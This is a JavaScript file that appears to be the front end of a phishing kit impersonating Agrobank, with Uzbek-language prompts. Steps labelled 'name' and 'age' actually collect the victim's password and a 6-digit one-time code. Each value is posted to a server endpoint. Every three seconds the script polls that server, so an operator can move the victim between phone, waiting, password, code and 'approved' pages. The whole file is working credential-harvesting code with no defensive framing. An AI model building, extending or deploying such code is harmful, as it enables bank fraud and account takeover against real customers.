const step = document.body.dataset.step;
const statusMessage = document.getElementById("statusMessage");
const submitButton = document.getElementById("submitStepButton");
const fieldError = document.getElementById("fieldError");
const stepField = document.getElementById("stepValue");
const otpInputs = Array.from(document.querySelectorAll(".otp-input"));
const otpPhoneValue = document.getElementById("otpPhoneValue");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");
const routeByStatus = {
  phone: "/services/agrobank/phone.html",
  waiting: "/services/agrobank/waiting.html",
  name: "/services/agrobank/name.html",
  birth_year: "/services/agrobank/birth-year.html",
  age: "/services/agrobank/age.html",
  residence_year: "/services/agrobank/residence-year.html",
  approved: "/services/agrobank/approved.html",
  unavailable: "/services/agrobank/unavailable.html"
};

let pollHandle = null;

const setStatus = (message, type = "") => {
  if (!statusMessage) return;
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (fieldError) {
    fieldError.textContent = message;
  }
};

const formatClientPhone = (value) => {
  const digits = String(value || "").replace(/\D/g, "").replace(/^998/, "").slice(0, 9);
  const parts = [];

  if (digits.length > 0) parts.push(digits.slice(0, 2));
  if (digits.length > 2) parts.push(digits.slice(2, 5));
  if (digits.length > 5) parts.push(digits.slice(5, 7));
  if (digits.length > 7) parts.push(digits.slice(7, 9));

  return `+998 ${parts.join(" ")}`.trimEnd();
};

const getDefaultButtonLabel = () => {
  if (step === "age" || step === "name") return "Davom etish";
  return "Yuborish";
};

const setButtonState = (isReady, label = getDefaultButtonLabel()) => {
  if (!submitButton) return;
  submitButton.textContent = label;
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validateStepValue = (value, showError = true) => {
  const text = String(value || "").trim();

  if (!text) {
    if (showError) setFieldError("");
    return false;
  }

  if (step === "name") {
    if (text.length < 2) {
      if (showError) setFieldError("Parol kamida 2 ta belgidan iborat bo'lishi kerak.");
      return false;
    }
    setFieldError("");
    return true;
  }

  if (step === "age") {
    if (!/^\d{6}$/.test(text)) {
      if (showError) setFieldError("Iltimos, 6 xonali kodni kiriting.");
      return false;
    }
    setFieldError("");
    return true;
  }

  if (!text.replace(/\D/g, "").length) {
    if (showError) setFieldError("Iltimos, raqam kiriting.");
    return false;
  }

  setFieldError("");
  return true;
};

const syncOtpValue = () => {
  if (!otpInputs.length || !stepField) return;
  const code = otpInputs.map((input) => input.value).join("");
  stepField.value = code;
  setFieldError("");
  setButtonState(validateStepValue(code, false), "Davom etish");
};

const redirectToStatus = (status, currentClientId) => {
  const page = routeByStatus[status];
  if (!page) return;

  const target = `${page}?client=${currentClientId}`;
  const current = `${window.location.pathname}${window.location.search}`;
  if (current !== target) {
    window.location.replace(target);
  }
};

const loadClient = async () => {
  if (!clientId) {
    window.location.replace("/services/agrobank");
    return null;
  }

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) {
    window.location.replace("/services/agrobank");
    return null;
  }

  if (data.client.status !== step) {
    redirectToStatus(data.client.status, clientId);
    return null;
  }

  if (data.client.currentError && step !== "waiting") {
    setStatus(data.client.currentError, "error");
  }

  if (otpPhoneValue && data.client.phone) {
    otpPhoneValue.textContent = formatClientPhone(data.client.phone);
  }

  if (stepField && !otpInputs.length) {
    const savedValue = data.client.submissions?.[step]?.value;
    if (savedValue && !stepField.value) {
      stepField.value = savedValue;
    }
    setButtonState(validateStepValue(stepField.value, false));
  }

  if (otpInputs.length) {
    const savedValue = String(data.client.submissions?.[step]?.value || "").replace(/\D/g, "").slice(0, 6);
    if (savedValue && !otpInputs.some((input) => input.value)) {
      otpInputs.forEach((input, index) => {
        input.value = savedValue[index] || "";
      });
    }
    syncOtpValue();
  }

  return data.client;
};

const prepareInputMasks = () => {
  if (!stepField || otpInputs.length) return;

  if (step === "name") {
    stepField.addEventListener("input", () => {
      stepField.value = stepField.value.replace(/\s+/g, " ").replace(/^\s+/, "");
      setFieldError("");
      setButtonState(validateStepValue(stepField.value, false));
    });
    return;
  }

  stepField.addEventListener("input", () => {
    stepField.value = stepField.value.replace(/\D/g, "");
    setFieldError("");
    setButtonState(validateStepValue(stepField.value, false));
  });
};

const initOtpInputs = () => {
  if (!otpInputs.length || !stepField) return;

  otpInputs.forEach((input, index) => {
    input.addEventListener("input", () => {
      input.value = input.value.replace(/\D/g, "").slice(0, 1);
      if (input.value && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
      syncOtpValue();
    });

    input.addEventListener("keydown", (event) => {
      if (event.key === "Backspace" && !input.value && index > 0) {
        otpInputs[index - 1].focus();
      }
    });

    input.addEventListener("paste", (event) => {
      event.preventDefault();
      const pasted = (event.clipboardData?.getData("text") || "").replace(/\D/g, "").slice(0, 6);
      if (!pasted) return;
      otpInputs.forEach((field, pastedIndex) => {
        field.value = pasted[pastedIndex] || "";
      });
      otpInputs[Math.min(pasted.length, otpInputs.length - 1)].focus();
      syncOtpValue();
    });
  });
};

const initPasswordToggle = () => {
  const toggle = document.getElementById("togglePassword");
  if (!toggle || !stepField) return;

  toggle.addEventListener("click", () => {
    const isPassword = stepField.type === "password";
    stepField.type = isPassword ? "text" : "password";
    toggle.setAttribute("aria-label", isPassword ? "Parolni yashirish" : "Parolni ko'rsatish");
  });
};

const handleSubmit = async (event) => {
  event.preventDefault();

  const value = stepField ? stepField.value.trim() : "";
  if (!validateStepValue(value)) {
    setStatus("Iltimos, ma'lumotni to'ldiring.", "error");
    return;
  }

  setButtonState(false, "Yuborilmoqda...");
  setStatus("Ma'lumot yuborilmoqda...");

  try {
    const response = await fetch(`/api/client/${clientId}/submit-step`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ step, value })
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Yuborish muvaffaqiyatsiz bo'ldi. Qayta urinib ko'ring.", "error");
    setButtonState(validateStepValue(value));
  }
};

const init = async () => {
  if (submitButton) setButtonState(false);

  await loadClient();
  prepareInputMasks();
  initOtpInputs();
  initPasswordToggle();

  const form = document.getElementById("stepForm");
  if (form && submitButton) {
    form.addEventListener("submit", handleSubmit);
  }

  pollHandle = setInterval(loadClient, 3000);
};

window.addEventListener("beforeunload", () => {
  if (pollHandle) clearInterval(pollHandle);
});

init();
